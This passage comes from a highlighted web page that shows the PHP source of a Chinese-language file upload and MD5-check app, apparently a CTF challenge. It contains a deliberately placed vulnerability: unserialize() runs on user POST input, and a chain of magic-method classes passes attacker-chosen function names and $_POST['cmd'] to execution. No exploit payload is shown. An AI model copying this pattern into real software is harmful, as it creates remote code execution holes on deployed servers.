class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ApplicationContext</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$contextName</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;contextName = <span class="string">&#x27;ApplicationContext&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;contextName = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt;contextName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ContentProcessor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$processedContent</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$callbackFunction</span>;   </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;processedContent = <span class="keyword">new</span> <span class="title class_">FunctionInvoker</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">property_exists</span>(<span class="variable">$this</span>, <span class="variable">$key</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_object</span>(<span class="variable">$this</span>-&gt;<span class="variable">$key</span>) &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;callbackFunction)) &#123;</span><br><span class="line">                </span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;callbackFunction&#125;(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileManager</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$targetFile</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$responseData</span> = <span class="string">&#x27;default_response&#x27;</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$targetFile</span> = <span class="literal">null</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;targetFile = <span class="variable">$targetFile</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filterPath</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\/|php:|data|zip|\.\.\//i&#x27;</span>,<span class="variable">$this</span>-&gt;targetFile))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;文件路径不符合规范&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">performWriteOperation</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123; </span><br><span class="line">        </span><br><span class="line">        <span class="variable">$targetObject</span> = <span class="variable language_">$this</span>-&gt;targetFile; </span><br><span class="line">        <span class="variable">$value</span> = <span class="variable">$targetObject</span>-&gt;<span class="variable">$var</span>; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFileHash</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">filterPath</span>(); </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;targetFile)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;targetFile)) &#123;</span><br><span class="line">                <span class="variable">$md5_hash</span> = <span class="title function_ invoke__">md5_file</span>(<span class="variable">$this</span>-&gt;targetFile);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;文件MD5哈希: &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$md5_hash</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;文件未找到&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">is_object</span>(<span class="variable">$this</span>-&gt;targetFile)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                </span><br><span class="line">                <span class="variable">$md5_hash</span> = <span class="title function_ invoke__">md5_file</span>(<span class="variable">$this</span>-&gt;targetFile);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;文件MD5哈希 (尝试): &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$md5_hash</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="built_in">TypeError</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">                </span><br><span class="line">                </span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;无法计算MD5哈希，因为文件参数无效: &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;文件未找到&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">method_exists</span>(<span class="variable">$this</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$method</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>];</span><br><span class="line">            <span class="variable">$var</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;var&#x27;</span>]) ? <span class="variable">$_POST</span>[<span class="string">&#x27;var&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="variable">$method</span>(<span class="variable">$var</span>); </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;responseData;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FunctionInvoker</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$functionName</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$functionArguments</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">            <span class="variable">$name</span>(<span class="variable">$arg</span>[<span class="number">0</span>]); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] : <span class="string">&#x27;home&#x27;</span>;</span><br><span class="line"><span class="variable">$output</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line"><span class="variable">$upload_dir</span> = <span class="string">&quot;upload/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$upload_dir</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$upload_dir</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;upload_file&#x27;</span>) &#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]) &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] == UPLOAD_ERR_OK) &#123;</span><br><span class="line">            <span class="variable">$allowed_extensions</span> = [<span class="string">&#x27;txt&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;jpg&#x27;</span>];</span><br><span class="line">            <span class="variable">$file_info</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">            <span class="variable">$file_extension</span> = <span class="title function_ invoke__">strtolower</span>(<span class="keyword">isset</span>(<span class="variable">$file_info</span>[<span class="string">&#x27;extension&#x27;</span>]) ? <span class="variable">$file_info</span>[<span class="string">&#x27;extension&#x27;</span>] : <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_extension</span>, <span class="variable">$allowed_extensions</span>)) &#123;</span><br><span class="line">                <span class="variable">$output</span> = <span class="string">&quot;&lt;p class=&#x27;text-red-600&#x27;&gt;不允许的文件类型。只允许 txt, png, gif, jpg。&lt;/p&gt;&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                </span><br><span class="line">                <span class="variable">$unique_filename</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">time</span>() . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file_extension</span>;</span><br><span class="line">                <span class="variable">$upload_path</span> = <span class="variable">$upload_dir</span> . <span class="variable">$unique_filename</span>;</span><br><span class="line">                <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_path</span>)) &#123;</span><br><span class="line">                    <span class="variable">$output</span> = <span class="string">&quot;&lt;p class=&#x27;text-green-600&#x27;&gt;文件上传成功！&lt;/p&gt;&quot;</span>;</span><br><span class="line">                    <span class="variable">$output</span> .= <span class="string">&quot;&lt;p class=&#x27;text-gray-700&#x27;&gt;文件路径：&lt;code class=&#x27;bg-gray-200 p-1 rounded&#x27;&gt;&quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$upload_path</span>) . <span class="string">&quot;&lt;/code&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$output</span> = <span class="string">&quot;&lt;p class=&#x27;text-red-600&#x27;&gt;上传失败！&lt;/p&gt;&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$output</span> = <span class="string">&quot;&lt;p class=&#x27;text-red-600&#x27;&gt;请选择一个文件上传。&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;home&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit_md5&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$filename_param</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file_to_check&#x27;</span>]) ? <span class="variable">$_POST</span>[<span class="string">&#x27;file_to_check&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$filename_param</span>)) &#123;</span><br><span class="line">        <span class="variable">$file_object</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$filename_param</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file_object</span> === <span class="literal">false</span> || !(<span class="variable">$file_object</span> <span class="keyword">instanceof</span> FileManager)) &#123;</span><br><span class="line">            <span class="variable">$file_object</span> = <span class="keyword">new</span> <span class="title class_">FileManager</span>(<span class="variable">$filename_param</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$output</span> = <span class="variable">$file_object</span>-&gt;<span class="title function_ invoke__">getFileHash</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$output</span> = <span class="string">&quot;&lt;p class=&#x27;text-gray-600&#x27;&gt;请输入文件路径进行MD5校验。&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;文件管理系统&lt;/title&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;https://cdn.tailwindcss.com&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;link href=<span class="string">&quot;https://fonts.googleapis.com/css2?family=Inter:wght@400;600&amp;display=swap&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body &#123;</span><br><span class="line">            font-family: <span class="string">&#x27;Inter&#x27;</span>, sans-serif;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body <span class="class"><span class="keyword">class</span>=&quot;<span class="title">bg</span>-<span class="title">gray</span>-100 <span class="title">flex</span> <span class="title">items</span>-<span class="title">center</span> <span class="title">justify</span>-<span class="title">center</span> <span class="title">min</span>-<span class="title">h</span>-<span class="title">screen</span> <span class="title">px</span>-4 <span class="title">py</span>-8&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">bg</span>-<span class="title">white</span> <span class="title">p</span>-6 <span class="title">md</span>:<span class="title">p</span>-8 <span class="title">rounded</span>-<span class="title">lg</span> <span class="title">shadow</span>-<span class="title">md</span> <span class="title">w</span>-<span class="title">full</span> <span class="title">max</span>-<span class="title">w</span>-4<span class="title">xl</span> <span class="title">mx</span>-<span class="title">auto</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">h1</span> <span class="title">class</span>=&quot;<span class="title">text</span>-3<span class="title">xl</span> <span class="title">font</span>-<span class="title">bold</span> <span class="title">mb</span>-6 <span class="title">text</span>-<span class="title">gray</span>-800 <span class="title">text</span>-<span class="title">center</span>&quot;&gt;文件管理系统&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">flex</span> <span class="title">justify</span>-<span class="title">center</span> <span class="title">mb</span>-6 <span class="title">space</span>-<span class="title">x</span>-4&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;?<span class="title">action</span>=<span class="title">home</span>&quot; <span class="title">class</span>=&quot;<span class="title">py</span>-2 <span class="title">px</span>-4 <span class="title">rounded</span>-<span class="title">lg</span> <span class="title">font</span>-<span class="title">semibold</span> &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">action</span> === &#x27;<span class="title">home</span>&#x27; ? &#x27;<span class="title">bg</span>-<span class="title">indigo</span>-600 <span class="title">text</span>-<span class="title">white</span>&#x27; : &#x27;<span class="title">bg</span>-<span class="title">indigo</span>-100 <span class="title">text</span>-<span class="title">indigo</span>-800 <span class="title">hover</span>:<span class="title">bg</span>-<span class="title">indigo</span>-200&#x27;; ?&gt;&quot;&gt;主页&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;?<span class="title">action</span>=<span class="title">upload_file</span>&quot; <span class="title">class</span>=&quot;<span class="title">py</span>-2 <span class="title">px</span>-4 <span class="title">rounded</span>-<span class="title">lg</span> <span class="title">font</span>-<span class="title">semibold</span> &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">action</span> === &#x27;<span class="title">upload_file</span>&#x27; ? &#x27;<span class="title">bg</span>-<span class="title">blue</span>-600 <span class="title">text</span>-<span class="title">white</span>&#x27; : &#x27;<span class="title">bg</span>-<span class="title">blue</span>-100 <span class="title">text</span>-<span class="title">blue</span>-800 <span class="title">hover</span>:<span class="title">bg</span>-<span class="title">blue</span>-200&#x27;; ?&gt;&quot;&gt;上传文件&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span> <span class="title">if</span> ($<span class="title">action</span> === &#x27;<span class="title">home</span>&#x27;): ?&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">center</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">p</span> <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">lg</span> <span class="title">text</span>-<span class="title">gray</span>-700 <span class="title">mb</span>-4&quot;&gt;欢迎使用文件管理系统。&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">p</span> <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">sm</span> <span class="title">text</span>-<span class="title">gray</span>-500 <span class="title">mb</span>-6&quot;&gt;</span></span><br><span class="line"><span class="class">                    为了确保文件一致性和完整性，请在下载前校验<span class="title">md5</span>值，完成下载后进行对比。</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                &lt;<span class="title">h2</span> <span class="title">class</span>=&quot;<span class="title">text</span>-2<span class="title">xl</span> <span class="title">font</span>-<span class="title">bold</span> <span class="title">mb</span>-4 <span class="title">text</span>-<span class="title">gray</span>-800&quot;&gt;文件列表&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">max</span>-<span class="title">h</span>-60 <span class="title">overflow</span>-<span class="title">y</span>-<span class="title">auto</span> <span class="title">border</span> <span class="title">border</span>-<span class="title">gray</span>-200 <span class="title">rounded</span>-<span class="title">lg</span> <span class="title">p</span>-2 <span class="title">bg</span>-<span class="title">gray</span>-50&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">                    $<span class="title">files</span> = <span class="title">array_diff</span>(<span class="title">scandir</span>($<span class="title">upload_dir</span>), <span class="title">array</span>(&#x27;.&#x27;, &#x27;..&#x27;));</span></span><br><span class="line"><span class="class">                    <span class="title">if</span> (<span class="title">empty</span>($<span class="title">files</span>)) </span>&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;&lt;p class=&#x27;text-gray-500&#x27;&gt;暂无文件。&lt;/p&gt;&quot;</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;&lt;ul class=&#x27;text-left space-y-2&#x27;&gt;&quot;</span>;</span><br><span class="line">                        <span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">                            <span class="variable">$file_path</span> = <span class="variable">$upload_dir</span> . <span class="variable">$file</span>;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;li class=&#x27;flex items-center justify-between p-2 bg-white rounded-md shadow-sm&#x27;&gt;&quot;</span>;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;span class=&#x27;text-gray-700 break-all mr-2&#x27;&gt;&quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$file</span>) . <span class="string">&quot;&lt;/span&gt;&quot;</span>;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;flex space-x-2&#x27;&gt;&quot;</span>;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;&quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$file_path</span>) . <span class="string">&quot;&#x27; download class=&#x27;bg-blue-500 hover:bg-blue-600 text-white text-xs py-1 px-2 rounded-lg transition duration-300 ease-in-out&#x27;&gt;下载&lt;/a&gt;&quot;</span>;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;form action=&#x27;?action=home&#x27; method=&#x27;POST&#x27; class=&#x27;inline-block&#x27;&gt;&quot;</span>;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;input type=&#x27;hidden&#x27; name=&#x27;file_to_check&#x27; value=&#x27;&quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$file_path</span>) . <span class="string">&quot;&#x27;&gt;&quot;</span>; </span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;button type=&#x27;submit&#x27; name=&#x27;submit_md5&#x27; class=&#x27;bg-purple-500 hover:bg-purple-600 text-white text-xs py-1 px-2 rounded-lg transition duration-300 ease-in-out&#x27;&gt;校验MD5&lt;/button&gt;&quot;</span>; </span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;/form&gt;&quot;</span>;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;/div&gt;&quot;</span>;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;&lt;/li&gt;&quot;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;&lt;/ul&gt;&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="meta">?&gt;</span></span><br><span class="line">                &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">                <span class="meta">&lt;?php</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$output</span>)): <span class="meta">?&gt;</span></span><br><span class="line">                    &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">mt</span>-6 <span class="title">p</span>-4 <span class="title">bg</span>-<span class="title">gray</span>-50 <span class="title">border</span> <span class="title">border</span>-<span class="title">gray</span>-200 <span class="title">rounded</span>-<span class="title">lg</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">h3</span> <span class="title">class</span>=&quot;<span class="title">lg</span> <span class="title">font</span>-<span class="title">semibold</span> <span class="title">mb</span>-2 <span class="title">text</span>-<span class="title">gray</span>-800&quot;&gt;校验结果:&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">output</span>; ?&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span> <span class="title">elseif</span> ($<span class="title">action</span> === &#x27;<span class="title">upload_file</span>&#x27;): ?&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">h2</span> <span class="title">class</span>=&quot;<span class="title">text</span>-2<span class="title">xl</span> <span class="title">font</span>-<span class="title">bold</span> <span class="title">mb</span>-4 <span class="title">text</span>-<span class="title">gray</span>-800 <span class="title">text</span>-<span class="title">center</span>&quot;&gt;上传文件&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">form</span> <span class="title">action</span>=&quot;?<span class="title">action</span>=<span class="title">upload_file</span>&quot; <span class="title">method</span>=&quot;<span class="title">POST</span>&quot; <span class="title">enctype</span>=&quot;<span class="title">multipart</span>/<span class="title">form</span>-<span class="title">data</span>&quot; <span class="title">class</span>=&quot;<span class="title">space</span>-<span class="title">y</span>-4&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">upload_file</span>&quot; <span class="title">class</span>=&quot;<span class="title">block</span> <span class="title">text</span>-<span class="title">gray</span>-700 <span class="title">text</span>-<span class="title">sm</span> <span class="title">font</span>-<span class="title">bold</span> <span class="title">mb</span>-2&quot;&gt;选择文件:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">name</span>=&quot;<span class="title">upload_file</span>&quot; <span class="title">id</span>=&quot;<span class="title">upload_file</span>&quot; <span class="title">class</span>=&quot;<span class="title">block</span> <span class="title">w</span>-<span class="title">full</span> <span class="title">text</span>-<span class="title">sm</span> <span class="title">text</span>-<span class="title">gray</span>-900 <span class="title">border</span> <span class="title">border</span>-<span class="title">gray</span>-300 <span class="title">rounded</span>-<span class="title">lg</span> <span class="title">cursor</span>-<span class="title">pointer</span> <span class="title">bg</span>-<span class="title">gray</span>-50 <span class="title">focus</span>:<span class="title">outline</span>-<span class="title">none</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">name</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">w</span>-<span class="title">full</span> <span class="title">bg</span>-<span class="title">blue</span>-500 <span 